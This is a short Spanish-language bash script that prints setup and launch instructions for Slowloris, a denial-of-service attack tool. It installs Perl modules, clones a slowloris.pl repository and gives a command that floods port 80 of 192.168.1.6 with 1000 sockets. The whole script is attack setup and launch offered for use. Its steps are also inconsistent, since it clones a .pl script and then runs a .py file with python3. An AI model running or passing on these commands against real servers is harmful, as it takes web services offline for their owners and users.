#!/bin/bash
echo """ copia los siguientes comandos y ejecutalos 
apt-get install perl
apt-get install libwww-mechanize-shell-perl
apt-get install libwww-mechanize-perl
git clone https://github.com/llaera/slowloris.pl
"""


echo "dale permisos: chmod 755 slowloris.pl"

echo "comando para ejecutar: python3 slowloris.py 192.168.1.6 -p 80 -s 1000"




